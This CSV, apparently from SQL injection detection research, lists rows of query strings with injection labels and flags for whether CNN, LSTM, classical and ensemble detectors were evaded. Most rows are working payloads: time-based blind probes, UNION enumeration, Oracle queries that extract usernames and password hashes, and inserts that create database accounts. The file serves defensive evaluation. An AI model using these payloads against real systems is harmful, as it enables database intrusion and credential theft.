,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
11749,"') and 0=benchmark(3000000,MD5(1))%20%23","') and 0=benchmark(3000000,MD5(1))%20%23",1,1,0,0,0,0,0
11750,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i",1,1,0,0,0,0,0
11751,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
11752,"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*","',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",1,1,0,0,0,0,0
11753,"""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","""),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",0,1,0,0,0,0,0
11754,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#",1,1,0,0,1,0,0
11755,' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i,' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i,1,1,0,0,0,0,0
11756,waitfor delay '0:0:20' /*,waitfor delay '0:0:20' /*,1,1,0,1,0,0,0
11757,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--","""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",0,1,0,0,0,0,0
11758,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
11759,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
11760,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",1,1,0,0,0,0,0
11761,SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country;,1,0,1,1,1,1,1
11762,SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country;,1,0,1,1,1,1,1
11763,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23",1,1,0,0,0,0,0
11764,1 and user_name() = 'dbo',1 and user_name() = 'dbo',1,1,0,0,0,0,0
11765,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*","+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*",0,1,0,0,0,0,0
11766,"'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
11767,""" or 1=1--",""" or 1=1--",0,1,0,0,0,0,0
11768,' or 1/*,' or 1/*,1,1,0,0,0,0,0
11769,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
11770,IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,1,1,1,1,0,1,0
11771,"and 0=benchmark(3000000,MD5(1))%20--","and 0=benchmark(3000000,MD5(1))%20--",0,1,0,0,0,0,0
11772,"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--","""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",0,1,0,0,0,0,0
11773,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i",1,1,0,0,0,0,0
11774,' or 2 between 1 and 3,' or 2 between 1 and 3,1,1,0,0,0,0,0
11775,""") and 0=benchmark(3000000,MD5(1))%20--",""") and 0=benchmark(3000000,MD5(1))%20--",0,1,0,0,0,0,0
11776,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",1,1,1,0,0,0,0
11777,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*","""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",0,1,0,0,0,0,0
11778,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",1,1,1,0,0,0,0
11779,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",1,1,1,0,0,0,0
11780,"insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123'))","insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123'))",1,1,0,0,0,0,0
11781,password:*/=1--,password:*/=1--,0,1,0,0,0,0,0
11782,ORDER BY 21,ORDER BY 21,0,1,1,1,0,1,0
11783,' -- &password=,' -- &password=,1,1,1,0,0,0,0
11784,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#",1,1,1,0,0,0,0
11785,"insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)","insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)",1,1,0,0,0,0,0
11786,SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country;,1,0,1,1,1,1,1
11787,"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
11788,'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >,'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >,1,1,1,0,0,0,0
11789,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1,1,0,0,0,0,0
11790,' or 'text' > 't',' or 'text' > 't',1,1,0,0,0,0,0
11791,"'))) and 0=benchmark(3000000,MD5(1))%20%23","'))) and 0=benchmark(3000000,MD5(1))%20%23",1,1,0,0,0,0,0
11792,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#",1,1,0,0,1,0,0
11793,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23","+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23",0,1,0,0,0,0,0
11794,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
11795,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
11796,"',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--","',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,1,0,0,0,0,0
11797,"') and 0=benchmark(3000000,MD5(1))%20--","') and 0=benchmark(3000000,MD5(1))%20--",1,1,0,0,0,0,0
11798,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
11799,"' || myappadmin.adduser('admin', 'newpass') || '","' || myappadmin.adduser('admin', 'newpass') || '",1,1,0,0,0,0,0
11800,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
11801,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23",1,1,0,0,0,0,0
11802,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i",1,1,0,0,0,0,0
11803,"""),NULL)%20waitfor%20delay%20'0:0:20'%20--","""),NULL)%20waitfor%20delay%20'0:0:20'%20--",0,1,0,0,0,0,0
11804,"""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","""),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",0,1,0,0,0,0,0
11805,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",1,1,0,0,0,0,0
11806,'))) waitfor delay '0:0:20' /*,'))) waitfor delay '0:0:20' /*,1,1,0,0,0,0,0
11807,SELECT COUNT(*) FROM game;,SELECT COUNT(*) FROM game;,1,0,1,1,1,1,1
11808,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23","""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23",0,1,0,0,0,0,0
11809,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
11810,"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12","UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12",1,1,1,1,0,1,0
11811,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
11812,""")))) and 0=benchmark(3000000,MD5(1))%20--",""")))) and 0=benchmark(3000000,MD5(1))%20--",0,1,0,0,0,0,0
11813,AnD SLEEP(5)#,AnD SLEEP(5)#,0,1,1,1,0,1,0
11814,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#","UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#",1,1,1,0,0,0,0
11815,"',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
11816,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
11817,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i",1,1,0,0,0,0,0
11818,",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,1,0,0,0,0,0
11819,UNION ALL SELECT 'INJ'||'ECT'||'XXX'--,UNION ALL SELECT 'INJ'||'ECT'||'XXX'--,1,1,1,0,0,0,0
11820,ORDER BY 3--,ORDER BY 3--,0,1,1,1,0,1,0
11821,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
11822,));waitfor delay '0:0:__TIME__'--,));waitfor delay '0:0:__TIME__'--,1,1,0,0,0,0,0
11823,"UNION ALL SELECT 1,2,3,4,5,6,7,8,9#","UNION ALL SELECT 1,2,3,4,5,6,7,8,9#",1,1,1,0,0,0,0
11824,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))",1,1,0,0,1,0,0
11825,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
11826,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
11827,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--",1,1,1,0,0,0,0
11828,"""))) waitfor delay '0:0:20' --","""))) waitfor delay '0:0:20' --",0,1,0,0,0,0,0
11829,"',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--","',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,1,0,0,0,0,0
11830,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",1,1,0,0,0,0,0
11831,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7",1,1,0,0,0,0,0
11832,' or 1/*,' or 1/*,1,1,0,0,0,0,0
11833,' or 1 in (select @@version)--,' or 1 in (select @@version)--,1,1,0,0,0,0,0
11834,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
11835,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
11836,AND 7300=7300 AND ('pKlZ'='pKlY,AND 7300=7300 AND ('pKlZ'='pKlY,1,1,1,0,0,0,0
11837,';waitfor delay '0:0:__TIME__'--,';waitfor delay '0:0:__TIME__'--,1,1,0,0,0,0,0
11838,1 exec sp_ (or exec xp_),1 exec sp_ (or exec xp_),0,1,1,0,0,0,0
11839,ORDER BY 15--,ORDER BY 15--,0,1,1,1,0,1,0
11840,' or '7659'='7659,' or '7659'='7659,1,1,0,0,0,0,0
11841,' or '1'='1,' or '1'='1,1,1,0,0,0,0,0
11842,' or 'something' like 'some%',' or 'something' like 'some%',1,1,0,0,0,0,0
11843,OR 1=0--,OR 1=0--,0,1,1,0,0,0,0
11844,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
11845,UNION ALL SELECT 1#,UNION ALL SELECT 1#,1,1,1,1,0,1,0
11846,"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--","UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--",1,1,1,1,0,1,0
11847,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
11848,"'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --","'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --",1,1,0,0,0,0,0
11849,")) and 0=benchmark(3000000,MD5(1))%20--",")) and 0=benchmark(3000000,MD5(1))%20--",0,1,0,0,0,0,0
11850,ORDER BY 28,ORDER BY 28,0,1,1,1,0,1,0
11851,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
11852,WHERE 1=1 AND 1=0#,WHERE 1=1 AND 1=0#,0,1,0,0,0,0,0
11853,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
11854,"UNION ALL SELECT 1,2#","UNION ALL SELECT 1,2#",1,1,1,1,0,1,0
11855,",NULL)%20waitfor%20delay%20'0:0:20'%20/*",",NULL)%20waitfor%20delay%20'0:0:20'%20/*",1,1,0,0,0,0,0
11856,INSERT INTO Documents WHERE ID=x,INSERT INTO Documents WHERE ID=x,1,0,1,1,1,1,1
11857,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",1,1,0,0,0,0,0
11858,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5",1,1,0,0,0,0,0
11859,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
11860,ORDER BY 26#,ORDER BY 26#,0,1,1,1,0,1,0
11861,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i,1,1,0,0,0,0,0
11862,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,1,0,0,0,0,0
11863,ORDER BY 7--,ORDER BY 7--,0,1,1,1,0,1,0
11864,pg_SLEEP(5)#,pg_SLEEP(5)#,0,1,0,1,0,0,0
11865,""",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",""",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",0,1,0,0,0,0,0
11866,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*",1,1,0,0,0,0,0
11867,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--","""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--",0,1,0,0,0,0,0
11868,",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",1,1,0,0,0,0,0
11869,"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--","""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--",0,1,0,0,0,0,0
11870,INSERT INTO table,INSERT INTO table,1,0,1,1,0,1,0
11871,")) and 0=benchmark(3000000,MD5(1))%20%23",")) and 0=benchmark(3000000,MD5(1))%20%23",0,1,0,0,0,0,0
11872,"'),NULL)%20waitfor%20delay%20'0:0:20'%20--","'),NULL)%20waitfor%20delay%20'0:0:20'%20--",1,1,0,0,0,0,0
11873,""" and 0=benchmark(3000000,MD5(1))%20%23",""" and 0=benchmark(3000000,MD5(1))%20%23",0,1,0,0,0,0,0
11874,SLEEP(5)=',SLEEP(5)=',1,1,0,0,0,0,0
11875,"""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*","""),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",0,1,0,0,0,0,0
11876,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
11877,"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--","UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--",1,1,1,1,0,1,0
11878,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i",1,1,0,0,0,0,0
11879,SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country;,1,0,1,1,1,1,1
11880,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",1,1,0,0,0,0,0
11881,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
11882,""";",""";",0,1,1,1,1,1,1
11883,"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))--","AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))--",1,1,0,0,0,0,0
11884,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1,1,0,0,0,0,0
11885,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",1,1,0,0,0,0,0
11886,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --","1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",1,1,0,0,0,0,0
11887,"SELECT column1, column2 FROM table1, table2 WHERE column2='value';","SELECT column1, column2 FROM table1, table2 WHERE column2='value';",1,0,1,1,1,1,1
11888,"'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --","'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --",1,1,0,0,0,0,0
11889,SELECT * FROM Users;,SELECT * FROM Users;,1,0,1,1,1,1,1
11890,(||6),(||6),0,1,0,0,0,0,0
11891,"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2","UNION ALL SELECT 'INJ'||'ECT'||'XXX',2",1,1,1,0,0,0,0
11892,CREATE TABLE Employees,CREATE TABLE Employees,1,0,1,1,1,1,1
11893,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i","' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i",1,1,0,0,0,0,0
11894,"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--","+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",0,1,0,0,0,0,0
11895,"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*","""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",0,1,0,0,0,0,0
11896,"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#","ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",1,1,0,0,0,0,0
11897,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*","'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/*",1,1,0,0,0,0,0
